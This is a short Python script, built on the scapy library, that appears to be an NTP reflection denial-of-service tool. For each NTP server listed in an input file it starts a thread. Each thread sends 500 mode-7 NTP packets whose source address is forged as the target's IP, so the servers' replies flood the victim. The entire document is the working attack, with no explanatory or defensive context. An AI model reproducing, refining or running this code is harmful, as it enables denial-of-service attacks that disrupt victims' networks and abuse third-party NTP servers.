#!/usr/bin/env python
import sys
from scapy.all import *
import threading
class ntpThread(threading.Thread):
    def __init__(self,target,ntp_server):
        threading.Thread.__init__(self)
        self.thread_target = target
        self.thread_ntpserver = ntp_server
    def run(self):
        pkt=IP(dst=self.thread_ntpserver, src=self.thread_target)/(UDP(sport=52816)/NTP(version=2, mode=7, stratum=0, poll=3, precision=42))
        send(pkt,inter=3,count=500)
if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)
 
    target = sys.argv[1]
    ntp_server_file = sys.argv[2]
    for ntp_server in open(ntp_server_file, "r"):
        ntp_server = ntp_server.strip()
        if ntp_server != "":
            t = ntpThread(target,ntp_server)
            t.start()
            
